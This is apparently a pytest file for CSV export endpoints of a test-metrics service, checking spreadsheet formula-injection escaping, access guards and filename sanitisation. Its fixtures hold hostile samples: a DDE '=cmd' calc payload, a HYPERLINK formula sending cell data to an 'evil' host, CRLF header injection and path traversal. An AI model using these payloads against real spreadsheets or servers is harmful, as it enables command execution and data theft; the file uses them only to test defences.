"""EXEC-06: the execution metrics as CSV downloads.

``GET /api/v1/runs/{run_id}/timing.csv`` (every test of one run) and
``GET /api/v1/analytics/execution-metrics.csv`` (the per-suite table of
``/analytics/execution-metrics``). What is pinned here:

* the cells: formula injection neutralised (``=cmd`` opens as text), a null
  figure an EMPTY cell and a measured 0 a ``0``, instants in UTC, a BOM and
  CRLF rows (the UI export's layout);
* the run file: its exact header, one row per test of the run, the effective
  suite, slowest first (the statement run on a real SQL engine);
* the guards: a run the caller cannot read is a 404 and its rows are never
  read; an unknown run is a 404 for an administrator too; a project the caller
  cannot read is the EMPTY file (header, no rows) -- the JSON route's denied
  shape, never a 403 that confirms the project exists;
* the scope: the file uses the JSON route's own policy, and its suite rows are
  that route's ``suites.items``.
"""
from __future__ import annotations

import uuid
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.services import csv_safe
from app.services import execution_metrics_export_service as export

PROJECT = uuid.UUID("11111111-1111-4111-8111-111111111111")
OTHER_PROJECT = uuid.UUID("22222222-2222-4222-8222-222222222222")
RUN = uuid.UUID("33333333-3333-4333-8333-333333333333")
T0 = datetime(2026, 10, 14, 10, 0, 0, tzinfo=timezone.utc)

RUN_HEADER = (
    "test_name,suite_name,status,duration_ms,started_at,finished_at,"
    "setup_ms,call_ms,teardown_ms,worker_id,timing_source"
)
SUITE_HEADER = (
    "suite_name,suite_key,runs,wall_n,wall_p50_ms,wall_p95_ms,summed_n,summed_p50_ms,summed_p95_ms,"
    "previous_runs,previous_wall_n,previous_wall_p50_ms,previous_wall_p95_ms,previous_summed_n,"
    "previous_summed_p50_ms,previous_summed_p95_ms,wall_p50_change_pct,wall_p95_change_pct,"
    "summed_p50_change_pct,summed_p95_change_pct"
)


# ── 1. the cells ────────────────────────────────────────────────────────────


@pytest.mark.parametrize(("value", "expected"), [
    # The UI writer's cases (``frontend/src/lib/viz/csv.test.ts``; the CLI's
    # ``chart_render.csv_cell`` agrees on every one of them).
    ("=1+1", "'=1+1"),
    ("+1+1", "'+1+1"),
    ("-1+1", "'-1+1"),
    ("@SUM(A1:A2)", "'@SUM(A1:A2)"),
    ("x;=1+1", "\"x;'=1+1\""),
    ("＝1", "'＝1"),
    (" =1", "' =1"),
    ("-A1", "'-A1"),
    ("a=1", "a=1"),
    ("test_x[1,-2]", '"test_x[1,-2]"'),
    ("-5", "-5"),
    ("-1e-7", "-1e-7"),
    (-5, "-5"),
    (88.0, "88"),
    (0.1 + 0.2, "0.30000000000000004"),
    (None, ""),
    (0, "0"),
    # Stricter than the UI writer: a cell that BEGINS with a tab or CR.
    ("\t=1", "\"'\t'=1\""),
    ("\tplain", "\"'\tplain\""),
    ("\r=1", "\"'\r'=1\""),
    ('=HYPERLINK("http://evil/?"&A1,"click")', '"\'=HYPERLINK(""http://evil/?""&A1,""click"")"'),
    (True, "true"),
    (RUN, str(RUN)),
])
def test_a_cell_is_inert_in_a_spreadsheet(value, expected):
    assert csv_safe.csv_cell(value) == expected


def test_an_instant_is_written_in_utc():
    plus_two = timezone(timedelta(hours=2))
    assert csv_safe.csv_cell(datetime(2026, 10, 14, 12, 0, tzinfo=plus_two)) == "2026-10-14T10:00:00+00:00"
    assert csv_safe.csv_cell(datetime(2026, 10, 14, 10, 0)) == "2026-10-14T10:00:00+00:00"


def test_the_file_has_a_bom_crlf_rows_and_chunks_its_records():
    chunks = list(csv_safe.iter_csv(("a", "b"), ([i, None] for i in range(5)), chunk_rows=2))
    assert chunks[0] == "﻿a,b\r\n"
    assert chunks[1:] == ["0,\r\n1,\r\n", "2,\r\n3,\r\n", "4,\r\n"]


@pytest.mark.parametrize(("value", "expected"), [
    ("1234", "1234"),
    ("release/2026.10 #7", "release_2026.10_7"),
    ('1"\r\nX-Evil: 1', "1_X-Evil_1"),
    ("../../etc", "etc"),
    ("", "fallback"),
    (None, "fallback"),
    ("決済", "fallback"),
])
def test_a_build_number_cannot_break_the_header_or_the_name(value, expected):
    assert csv_safe.filename_segment(value, fallback="fallback") == expected


def test_the_run_file_is_named_after_its_build():
    assert export.run_timing_filename("1234", RUN) == "run-1234-timing.csv"
    assert export.run_timing_filename(None, RUN) == "run-33333333-timing.csv"


# ── 2. the run file's statement, on a real SQL engine ──────────────────────

_SQLITE_DDL = (
    "CREATE TABLE test_runs (id TEXT PRIMARY KEY, trigger_source TEXT, primary_suite_name TEXT)",
    "CREATE TABLE test_cases (id TEXT PRIMARY KEY, test_run_id TEXT, test_name TEXT, suite_name TEXT, "
    "status TEXT, duration_ms INTEGER, started_at TEXT, finished_at TEXT, setup_ms INTEGER, "
    "call_ms INTEGER, teardown_ms INTEGER, worker_id TEXT, timing_source TEXT)",
)


async def _sqlite_rows(runs: list[tuple], cases: list[tuple], run_id: str, limit: int):
    """``load_run_timing_rows`` against SQLite holding only the columns it reads.

    Not PostgreSQL, but a real planner over real rows: the run filter, the
    effective-suite CASE, ``NULLS LAST`` and the LIMIT all execute."""
    from sqlalchemy import text
    from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine

    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    try:
        async with engine.begin() as conn:
            for ddl in _SQLITE_DDL:
                await conn.execute(text(ddl))
            for row in runs:
                await conn.execute(text("INSERT INTO test_runs VALUES (:a, :b, :c)"), dict(zip("abc", row)))
            for row in cases:
                await conn.execute(
                    text("INSERT INTO test_cases (id, test_run_id, test_name, suite_name, status, duration_ms, "
                         "worker_id) VALUES (:a, :b, :c, :d, :e, :f, :g)"),
                    dict(zip("abcdefg", row)),
                )
        async with AsyncSession(engine) as db:
            return await export.load_run_timing_rows(db, run_id, limit=limit)
    finally:
        await engine.dispose()


async def test_every_test_of_the_run_slowest_first_with_its_effective_suite():
    upload, live, other = "run-upload", "run-live", "run-other"
    runs = [(upload, "upload", None), (live, "live_stream", " Checkout "), (other, "upload", None)]
    cases = [
        ("c1", upload, "test_fast", "Cart", "PASSED", 10, "0"),
        ("c2", upload, "test_slow", "Pay", "FAILED", 900, "1"),
        ("c3", upload, "=cmd|' /C calc'!A0", "Cart", "PASSED", None, None),
        ("c4", upload, "test_zero", "  ", "SKIPPED", 0, None),
        ("c5", live, "test_live", "SomeClass", "PASSED", 5, None),
        ("c6", other, "not_this_run", "Cart", "PASSED", 99999, None),
    ]
    records, truncated = await _sqlite_rows(runs, cases, upload, limit=100)
    assert truncated is False
    assert [r[0] for r in records] == ["test_slow", "test_fast", "test_zero", "=cmd|' /C calc'!A0"], (
        "slowest first, a null duration last, and only this run's tests"
    )
    assert records[0][1:4] == ("Pay", "FAILED", 900)
    assert records[2][1] is None, "a blank suite is no suite, not '  '"
    assert records[3][3] is None, "a null duration stays null"

    live_records, _ = await _sqlite_rows(runs, cases, live, limit=100)
    assert live_records[0][1] == "Checkout", "a live-stream run's tests take the run's suite label"


async def test_a_run_over_the_cap_says_it_was_cut():
    runs = [("r", "upload", None)]
    cases = [(f"c{i}", "r", f"t{i}", "S", "PASSED", i, None) for i in range(3)]
    records, truncated = await _sqlite_rows(runs, cases, "r", limit=2)
    assert truncated is True and len(records) == 2
    records, truncated = await _sqlite_rows(runs, cases, "r", limit=3)
    assert truncated is False and len(records) == 3


# ── 3. the run route ────────────────────────────────────────────────────────


def _user(role: str, bound_project=None):
    user = SimpleNamespace(id=uuid.uuid4(), role=role, is_active=True)
    if bound_project is not None:
        # What ``get_current_user_or_api_key`` stamps on a project-bound key.
        setattr(user, "_testlookup_api_key_project_id", bound_project)
    return user


def _case(name, suite, status, duration, **timing):
    fields = {key: timing.get(key) for key in (
        "started_at", "finished_at", "setup_ms", "call_ms", "teardown_ms", "worker_id", "timing_source",
    )}
    return SimpleNamespace(test_name=name, suite_name=suite, status=status, duration_ms=duration, **fields)


CASES = [
    _case("checkout::test_pay", "Checkout", "FAILED", 1800, started_at=T0,
          finished_at=T0 + timedelta(milliseconds=1800), setup_ms=120, call_ms=1600, teardown_ms=80,
          worker_id="gw1", timing_source="report"),
    _case("=cmd|' /C calc'!A0", "@evil", "PASSED", 0, started_at=T0, finished_at=T0, setup_ms=0,
          call_ms=0, teardown_ms=0, worker_id="gw0", timing_source="report"),
    _case("junit_style", None, "PASSED", 25),
    _case("not_timed", "Cart", "SKIPPED", None),
]


def _result(*, scalar=None, one=None, rows=None):
    return MagicMock(
        scalar_one_or_none=MagicMock(return_value=scalar),
        one_or_none=MagicMock(return_value=one),
        all=MagicMock(return_value=rows or []),
    )


@pytest.fixture
def run_api():
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from app.core.deps import get_current_active_user
    from app.db.postgres import get_db
    from app.routers import execution_metrics_export as router

    app = FastAPI()
    app.include_router(router.runs_router)
    state = {"user": _user("VIEWER"), "member": True, "run_project": PROJECT, "build": "1234",
             "cases": list(CASES), "sql": []}
    db = AsyncMock()

    async def execute(stmt, params=None, *a, **k):
        sql = str(stmt)
        state["sql"].append(sql)
        if "project_members" in sql:
            return _result(scalar=uuid.uuid4() if state["member"] else None)
        if "FROM test_cases tc" in sql:
            return _result(rows=state["cases"][: params["limit"]])
        if "test_runs.build_number" in sql:
            found = state["run_project"] is not None
            return _result(one=SimpleNamespace(id=RUN, build_number=state["build"]) if found else None)
        if "test_runs" in sql:
            return _result(scalar=state["run_project"])
        raise AssertionError(sql)

    db.execute = AsyncMock(side_effect=execute)

    async def _db():
        yield db

    app.dependency_overrides[get_db] = _db
    app.dependency_overrides[get_current_active_user] = lambda: state["user"]
    return TestClient(app, raise_server_exceptions=False), state


def _rows_were_read(state) -> bool:
    return any("FROM test_cases tc" in sql for sql in state["sql"])


def test_a_member_downloads_one_row_per_test_of_the_run(run_api):
    http, _state = run_api
    resp = http.get(f"/api/v1/runs/{RUN}/timing.csv")
    assert resp.status_code == 200, resp.text
    assert resp.headers["content-type"].startswith("text/csv")
    assert resp.headers["content-disposition"] == 'attachment; filename="run-1234-timing.csv"'
    assert resp.headers["x-row-count"] == "4" and resp.headers["x-truncated"] == "false"
    raw = resp.content.decode("utf-8")
    assert raw.startswith("﻿") and "\r\n" in raw
    lines = raw.lstrip("﻿").split("\r\n")
    assert lines[0] == RUN_HEADER
    assert lines[-1] == ""
    body = lines[1:-1]
    assert len(body) == len(CASES), "one row per test in the run"
    assert body[0] == (
        "checkout::test_pay,Checkout,FAILED,1800,2026-10-14T10:00:00+00:00,"
        "2026-10-14T10:00:01.800000+00:00,120,1600,80,gw1,report"
    )


def test_a_formula_named_test_is_written_inert(run_api):
    http, _state = run_api
    lines = http.get(f"/api/v1/runs/{RUN}/timing.csv").content.decode("utf-8").split("\r\n")
    assert lines[2].startswith("'=cmd|' /C calc'!A0,'@evil,PASSED,0,"), lines[2]
    assert "=cmd" not in lines[2].replace("'=cmd", ""), "no cell starts with = any more"


def test_not_reported_is_empty_and_a_measured_zero_is_zero(run_api):
    http, _state = run_api
    lines = http.get(f"/api/v1/runs/{RUN}/timing.csv").content.decode("utf-8").split("\r\n")
    assert lines[2].endswith(",0,0,0,gw0,report"), "a measured 0 ms phase is 0"
    assert lines[3] == "junit_style,,PASSED,25,,,,,,,", "a JUnit row reports no timing: empty, never 0"
    assert lines[4] == "not_timed,Cart,SKIPPED,,,,,,,,"


@pytest.mark.parametrize("role", ["VIEWER", "QA_ENGINEER", "QA_LEAD"])
def test_a_non_member_gets_404_and_no_row_is_read(run_api, role):
    http, state = run_api
    state["user"], state["member"] = _user(role), False
    resp = http.get(f"/api/v1/runs/{RUN}/timing.csv")
    assert resp.status_code == 404
    assert resp.json() == {"detail": "Test run not found"}
    assert "checkout::test_pay" not in resp.text
    assert not _rows_were_read(state)


def test_a_key_bound_to_another_project_gets_404(run_api):
    http, state = run_api
    state["user"] = _user("ADMIN", bound_project=OTHER_PROJECT)
    resp = http.get(f"/api/v1/runs/{RUN}/timing.csv")
    assert resp.status_code == 404
    assert not _rows_were_read(state)


def test_an_unknown_run_is_404_for_a_member_and_for_an_admin(run_api):
    http, state = run_api
    state["run_project"] = None
    for role in ("VIEWER", "ADMIN"):
        state["user"] = _user(role)
        resp = http.get(f"/api/v1/runs/{uuid.uuid4()}/timing.csv")
        assert resp.status_code == 404, role
    assert not _rows_were_read(state)


def test_an_admin_reads_any_run(run_api):
    http, state = run_api
    state["user"], state["member"] = _user("ADMIN"), False
    assert http.get(f"/api/v1/runs/{RUN}/timing.csv").status_code == 200


def test_a_malformed_run_id_is_refused(run_api):
    http, _state = run_api
    assert http.get("/api/v1/runs/not-a-uuid/timing.csv").status_code in (400, 422)


def test_a_hostile_build_number_does_not_reach_the_header(run_api):
    http, state = run_api
    state["build"] = '7"; filename="evil.exe'
    resp = http.get(f"/api/v1/runs/{RUN}/timing.csv")
    assert resp.headers["content-disposition"] == 'attachment; filename="run-7_filename_evil.exe-timing.csv"'


def test_a_cut_file_says_so(run_api):
    http, _state = run_api
    original = export.load_run_timing_rows

    async def capped(db, run_id):
        return await original(db, run_id, limit=2)

    with patch.object(export, "load_run_timing_rows", capped):
        resp = http.get(f"/api/v1/runs/{RUN}/timing.csv")
    assert resp.headers["x-truncated"] == "true" and resp.headers["x-row-count"] == "2"
    assert len(resp.content.decode("utf-8").split(csv_safe.LINE_END)) == 1 + 2 + 1


# ── 4. the project route ────────────────────────────────────────────────────


def _window(runs, wall, summed):
    def pct(values):
        if values is None:
            return {"n": 0, "p50_ms": None, "p95_ms": None, "measured": False, "reason": "not reported"}
        return {"n": runs, "p50_ms": values[0], "p95_ms": values[1], "measured": True, "reason": None}
    return {"runs": runs, "wall": pct(wall), "summed": pct(summed)}


SUITES = [
    {
        "suite_key": "checkout", "suite_name": "Checkout",
        "current": _window(20, (5000.0, 6100.0), (9000.0, 9900.0)),
        "previous": _window(18, (4444.5, 6000.0), (8000.0, 9900.0)),
        "wall_p50_change_pct": 12.5, "wall_p95_change_pct": 1.7,
        "summed_p50_change_pct": 12.5, "summed_p95_change_pct": 0.0,
    },
    {
        "suite_key": "=cmd", "suite_name": "=cmd|' /C calc'!A0",
        "current": _window(3, None, (120.0, 300.0)),
        "previous": _window(0, None, None),
        "wall_p50_change_pct": None, "wall_p95_change_pct": None,
        "summed_p50_change_pct": None, "summed_p95_change_pct": None,
    },
]


def _payload(project_id=PROJECT, *, truncated=False):
    return {
        "project_id": project_id, "days": 30,
        "suites": {"limit": 200, "total": 3 if truncated else 2, "truncated": truncated, "items": SUITES},
    }


@pytest.fixture
def metrics_api():
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from fastapi.exceptions import RequestValidationError

    from app.core.analytics_errors import (
        AnalyticsQueryError,
        analytics_query_error_handler,
        validation_exception_handler,
    )
    from app.core.deps import get_current_active_user
    from app.db.postgres import get_db
    from app.routers import execution_metrics_export as router

    app = FastAPI()
    # The two handlers ``app.main`` installs for the VIZ-210 error bodies.
    app.add_exception_handler(AnalyticsQueryError, analytics_query_error_handler)
    app.add_exception_handler(RequestValidationError, validation_exception_handler)
    app.include_router(router.analytics_router)
    state = {"user": _user("VIEWER"), "accessible": {PROJECT}, "releases": []}
    db = AsyncMock()

    async def _db():
        yield db

    async def accessible(_db, _user):
        return state["accessible"]

    async def releases(_db, ids, _user):
        state["releases"].append(tuple(ids))
        return list(ids)

    real = router.svc.project_execution_metrics

    async def metrics(db_, scope, **kwargs):
        state["call"] = {"scope": scope, **kwargs}
        # The real request parser, so a bad ``suite_limit`` is the route's 422.
        router.svc.parse_metrics_request(kwargs["top"], kwargs["suite_limit"], kwargs["branch"])
        if scope.denied:
            return await real(db_, scope, **kwargs)
        return _payload(scope.project_id, truncated=state.get("truncated", False))

    app.dependency_overrides[get_db] = _db
    app.dependency_overrides[get_current_active_user] = lambda: state["user"]
    with patch("app.core.deps.get_accessible_project_ids", accessible), \
            patch("app.core.deps.resolve_release_query_scopes", releases), \
            patch.object(router.svc, "project_execution_metrics", AsyncMock(side_effect=metrics)):
        yield TestClient(app, raise_server_exceptions=False), state


def test_a_member_downloads_one_row_per_suite(metrics_api):
    http, state = metrics_api
    resp = http.get("/api/v1/analytics/execution-metrics.csv", params={"project_id": str(PROJECT)})
    assert resp.status_code == 200, resp.text
    assert resp.headers["content-disposition"] == 'attachment; filename="execution-metrics-11111111-30d.csv"'
    assert resp.headers["x-row-count"] == "2" and resp.headers["x-truncated"] == "false"
    lines = resp.content.decode("utf-8").lstrip("﻿").split("\r\n")
    assert lines[0] == SUITE_HEADER
    assert lines[1] == (
        "Checkout,checkout,20,20,5000,6100,20,9000,9900,18,18,4444.5,6000,18,8000,9900,12.5,1.7,12.5,0"
    )
    assert state["call"]["suite_limit"] == 200, "the file holds every suite the route can return"


def test_a_suite_without_a_wall_clock_has_empty_wall_cells_and_an_inert_name(metrics_api):
    http, _state = metrics_api
    lines = http.get(
        "/api/v1/analytics/execution-metrics.csv", params={"project_id": str(PROJECT)},
    ).content.decode("utf-8").lstrip("﻿").split("\r\n")
    assert lines[2] == "'=cmd|' /C calc'!A0,'=cmd,3,0,,,3,120,300,0,0,,,0,,,,,,", lines[2]


def test_the_scope_reaches_the_service_and_every_release_is_authorised(metrics_api):
    http, state = metrics_api
    r1, r2 = str(uuid.uuid4()), str(uuid.uuid4())
    resp = http.get("/api/v1/analytics/execution-metrics.csv", params=[
        ("project_id", str(PROJECT)), ("release_id", r1), ("release_id", r2),
        ("suite_name", "Checkout"), ("days", "7"), ("branch", "main"), ("suite_limit", "10"),
    ])
    assert resp.status_code == 200, resp.text
    assert state["releases"] == [(r1, r2)]
    call = state["call"]
    assert call["scope"].project_id == PROJECT and call["scope"].days == 7
    assert call["scope"].suite_names == ("Checkout",)
    assert call["branch"] == "main" and call["suite_limit"] == 10
    assert resp.headers["content-disposition"].endswith('-7d.csv"')


def test_a_project_the_caller_cannot_read_is_the_empty_file(metrics_api):
    http, state = metrics_api
    state["accessible"] = {OTHER_PROJECT}
    resp = http.get("/api/v1/analytics/execution-metrics.csv", params={"project_id": str(PROJECT)})
    assert resp.status_code == 200, "a 403 would confirm the project exists"
    assert resp.content.decode("utf-8") == "﻿" + SUITE_HEADER + "\r\n"
    assert resp.headers["x-row-count"] == "0"
    assert str(PROJECT)[:8] not in resp.headers["content-disposition"]
    assert "Checkout" not in resp.text
    assert state["call"]["scope"].denied is True
    assert state["releases"] == [], "nothing else is resolved for a denied scope"


def test_project_id_is_required(metrics_api):
    http, _state = metrics_api
    resp = http.get("/api/v1/analytics/execution-metrics.csv")
    assert resp.status_code == 422
    assert resp.json()["code"] == "missing_parameter"


def test_an_out_of_range_suite_limit_is_a_contract_422(metrics_api):
    http, _state = metrics_api
    resp = http.get("/api/v1/analytics/execution-metrics.csv",
                    params={"project_id": str(PROJECT), "suite_limit": "999"})
    assert resp.status_code == 422
    assert resp.json()["param"] == "suite_limit"


def test_a_cut_suite_table_says_so(metrics_api):
    http, state = metrics_api
    state["truncated"] = True
    resp = http.get("/api/v1/analytics/execution-metrics.csv", params={"project_id": str(PROJECT)})
    assert resp.headers["x-truncated"] == "true"


def test_the_file_is_scoped_exactly_as_the_json_route():
    """One policy for the JSON and the file, so they can never disagree about
    who may read which project (the JSON router keeps its own private)."""
    from app.routers import execution_metrics, execution_metrics_export

    assert execution_metrics_export.EXECUTION_METRICS_SCOPE == execution_metrics._EXECUTION_METRICS


def test_the_suite_rows_read_the_response_model_too():
    """The rows are taken from ``ExecutionMetricsResponse`` fields, so a model
    instance and its dict give the same file."""
    from app.models.schemas import ExecutionMetricsResponse

    model = ExecutionMetricsResponse(
        days=30,
        suites={"limit": 50, "total": 2, "truncated": False, "items": SUITES},
        regressions={
            "rule": {"recent_runs": 5, "baseline_runs": 20, "min_baseline_runs": 10, "ratio": 1.5,
                     "test_min_samples": 10, "test_ratio": 1.5},
            "suites": {}, "tests": {},
        },
        slowest_tests={"limit": 20},
    )
    assert export.execution_suite_rows(model) == export.execution_suite_rows(_payload())
